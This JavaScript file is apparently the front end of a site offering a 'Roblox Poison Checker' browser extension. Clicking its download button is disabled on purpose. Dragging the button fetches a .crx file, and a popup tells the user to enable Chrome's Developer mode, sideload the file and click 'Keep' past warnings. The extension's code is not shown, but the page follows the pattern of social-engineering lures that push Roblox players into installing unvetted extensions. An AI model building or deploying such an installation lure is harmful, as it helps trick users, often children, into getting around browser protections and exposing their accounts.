// script.js - Roblox Poison Checker Website (Drag Only)

// Initialize drag functionality
function initializeDragOnly() {
    const dragButton = document.getElementById('dragButton');
    
    if (!dragButton) return;
    
    // Remove click functionality
    dragButton.style.cursor = 'grab';
    
    // Prevent clicking from doing anything
    dragButton.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        showDragOnlyMessage();
        return false;
    });
    
    // Drag start - download CRX file
    dragButton.addEventListener('dragstart', function(e) {
        // Set drag effects
        e.dataTransfer.effectAllowed = 'copy';
        e.dataTransfer.setData('text/plain', 'Roblox_Poison_Checker.crx');
        
        // Visual feedback
        dragButton.textContent = "🚀 Releasing...";
        dragButton.style.background = 'linear-gradient(45deg, #4CAF50, #45a049)';
        dragButton.style.cursor = 'grabbing';
        
        // Start CRX download
        downloadCRXFile();
    });
    
    // Drag end - reset button
    dragButton.addEventListener('dragend', function() {
        dragButton.textContent = "🎯 Drag me to Extensions";
        dragButton.style.background = 'linear-gradient(45deg, #FF6B6B, #FF8E53)';
        dragButton.style.cursor = 'grab';
    });
    
    // Drag over - visual feedback
    dragButton.addEventListener('dragover', function(e) {
        e.preventDefault();
        dragButton.style.transform = 'scale(1.1)';
    });
    
    // Drag leave - reset visual
    dragButton.addEventListener('dragleave', function() {
        dragButton.style.transform = 'scale(1)';
    });
}

// Download CRX file function
function downloadCRXFile() {
    try {
        const link = document.createElement('a');
        link.href = 'Roblox_Poison_Checker.crx';
        link.download = 'Roblox_Poison_Checker.crx';
        link.style.display = 'none';
        
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        console.log('✅ CRX download started via drag');
        
        // Show success message
        setTimeout(() => {
            showDragSuccessMessage();
        }, 500);
        
    } catch (error) {
        console.error('Download error:', error);
        showDownloadError();
    }
}

// Show drag-only instruction message
function showDragOnlyMessage() {
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #00264d;
        color: white;
        padding: 20px;
        border-radius: 10px;
        border: 2px solid #FF6B6B;
        z-index: 10000;
        text-align: center;
        max-width: 300px;
    `;
    
    message.innerHTML = `
        <h3 style="color: #FF6B6B; margin-bottom: 10px;">🖱️ Drag Only</h3>
        <p>Please <strong>drag</strong> the button to your extensions page instead of clicking.</p>
        <button onclick="this.parentElement.remove()" style="background: #FF6B6B; color: white; border: none; padding: 8px 16px; border-radius: 5px; margin-top: 10px; cursor: pointer;">
            Got it
        </button>
    `;
    
    document.body.appendChild(message);
}

// Show drag success message
function showDragSuccessMessage() {
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #00264d;
        color: white;
        padding: 25px;
        border-radius: 10px;
        border: 2px solid #4CAF50;
        z-index: 10000;
        text-align: center;
        max-width: 400px;
    `;
    
    message.innerHTML = `
        <h3 style="color: #4CAF50; margin-bottom: 15px;">✅ File Ready!</h3>
        
        <div style="text-align: left; background: #001f3f; padding: 15px; border-radius: 5px; margin: 15px 0;">
            <strong>Now complete installation:</strong>
            <ol style="margin: 10px 0; padding-left: 20px;">
                <li>Go to: <code>chrome://extensions</code></li>
                <li>Enable <strong>Developer mode</strong> 🔧</li>
                <li>Drag the downloaded file onto the page</li>
                <li>Click <strong>"Keep"</strong> if prompted</li>
            </ol>
        </div>
        
        <button onclick="this.parentElement.remove()" style="background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
            Start Installing ›
        </button>
    `;
    
    document.body.appendChild(message);
}

// Show download error message
function showDownloadError() {
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #00264d;
        color: white;
        padding: 20px;
        border-radius: 10px;
        border: 2px solid #FF6B6B;
        z-index: 10000;
        text-align: center;
        max-width: 300px;
    `;
    
    message.innerHTML = `
        <h3 style="color: #FF6B6B; margin-bottom: 10px;">❌ Download Failed</h3>
        <p>Please try dragging the button again.</p>
        <button onclick="this.parentElement.remove()" style="background: #FF6B6B; color: white; border: none; padding: 8px 16px; border-radius: 5px; margin-top: 10px; cursor: pointer;">
            Try Again
        </button>
    `;
    
    document.body.appendChild(message);
}

// Add some visual effects to the page
function addVisualEffects() {
    // Add subtle animation to feature cards
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    });

    // Observe feature cards
    document.querySelectorAll('.feature-card').forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        card.style.transition = 'all 0.6s ease';
        observer.observe(card);
    });
}

// Initialize everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeDragOnly();
    addVisualEffects();
    
    console.log('🔧 Roblox Poison Checker website initialized');
    console.log('🚫 Clicking disabled - drag only mode active');
});
